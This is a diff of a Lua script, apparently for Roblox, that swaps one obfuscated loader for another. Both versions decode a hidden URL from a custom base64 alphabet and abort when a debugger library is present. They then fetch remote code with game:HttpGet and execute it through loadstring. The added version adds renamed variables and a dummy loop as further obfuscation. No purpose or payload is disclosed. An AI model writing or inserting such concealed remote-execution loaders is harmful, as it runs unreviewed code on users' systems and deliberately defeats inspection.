@@ -1,61 +1,26 @@
-
-local _a = {}
-for _i = 1, 64 do
-    local _c = _i - 1
-    if _c < 26 then
-        _a[_i] = string.char(122 - _c)
-    elseif _c < 52 then
-        _a[_i] = string.char(90 - (_c - 26))
-    elseif _c < 62 then
-        _a[_i] = string.char(48 + (_c - 52))
-    elseif _c == 62 then
-        _a[_i] = "-"
-    else
-        _a[_i] = "+"
-    end
+local _0x = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210-+"
+local _1x = {}
+for _2x = 1, #_0x do
+    _1x[_0x:sub(_2x, _2x)] = _2x - 1
 end
-
-local _map = {}
-for _i = 1, #_a do
-    _map[_a[_i]] = _i - 1
+local _3x = "Zsi9Xsn3oB0Dbcm9adqKYR4QY79EXNu6oAy7ZvC5jMeD"
+local _4x = {}
+for _5x = 1, #_3x, 4 do
+    local _6x = _1x[_3x:sub(_5x, _5x)]
+    local _7x = _1x[_3x:sub(_5x + 1, _5x + 1)]
+    local _8x = _1x[_3x:sub(_5x + 2, _5x + 2)]
+    local _9x = _1x[_3x:sub(_5x + 3, _5x + 3)]
+    local _10x = _6x * 262144 + _7x * 4096 + _8x * 64 + _9x
+    _4x[#_4x + 1] = string.char(math.floor(_10x / 65536) % 256)
+    _4x[#_4x + 1] = string.char(math.floor(_10x / 256) % 256)
+    _4x[#_4x + 1] = string.char(_10x % 256)
 end
-
-local _parts = {
-    {9, 8, 21, 3, 42, 7, 31, 52},
-    {23, 19, 30, 29, 10, 7, 38, 28},
-    {1, 5, 49, 12, 44, 33, 17, 24},
-    {50, 11, 47, 6, 32, 16, 26, 36},
-    {15, 43, 4, 39, 18, 27, 14, 45},
-    {40, 25, 20, 53}
-}
-local _order = {1, 3, 2, 4, 5, 6}
-
-local _enc = ""
-for _i = 1, #_order do
-    local part = _parts[_order[_i]]
-    for _j = 1, #part do
-        _enc = _enc .. _a[part[_j] + 1]
-    end
+local _11x = table.concat(_4x)
+local _12x = 42
+for _13x = 1, 10 do
+    _12x = _12x + 1
 end
-
-local _dec = {}
-for _i = 1, #_enc, 4 do
-    local p1 = _map[_enc:sub(_i, _i)]
-    local p2 = _map[_enc:sub(_i + 1, _i + 1)]
-    local p3 = _map[_enc:sub(_i + 2, _i + 2)]
-    local p4 = _map[_enc:sub(_i + 3, _i + 3)]
-    local n = p1 * 262144 + p2 * 4096 + p3 * 64 + p4
-    _dec[#_dec + 1] = string.char(math.floor(n / 65536) % 256)
-    _dec[#_dec + 1] = string.char(math.floor(n / 256) % 256)
-    _dec[#_dec + 1] = string.char(n % 256)
+if type(debug) == "table" and type(debug.getinfo) == "function" then
+    error("")
 end
-local url = table.concat(_dec)
-
-local _guard = type(debug) == "table" and type(debug.getinfo) == "function"
-if _guard then
-    local _k = 0
-    for _ = 1, 100000 do _k = _k + 1 end
-    error(_k)
-end
-
-loadstring(game:HttpGet(url))()
+loadstring(game:HttpGet(_11x))()
